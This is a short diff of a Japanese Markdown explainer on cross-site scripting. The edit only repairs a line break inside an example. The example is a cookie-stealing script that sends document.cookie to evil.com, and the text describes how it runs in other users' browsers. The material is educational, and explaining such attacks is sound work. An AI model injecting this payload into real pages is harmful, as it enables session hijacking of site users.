@@ -2,8 +2,7 @@
 
 ## XSSとは？
 
-- 攻撃者が掲示板などのコメント欄に悪意あるスクリプト（例: `<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
-`）を投稿する
+- 攻撃者が掲示板などのコメント欄に悪意あるスクリプト（例: `<script>fetch('https://evil.com?cookie=' + document.cookie)</script>`）を投稿する
 - 他のユーザーがこのコメントを表示した際に、そのユーザーのブラウザでスクリプトが実行されてしまう
   - Cookieが盗まれてしまう
   - フォームが自動送信される
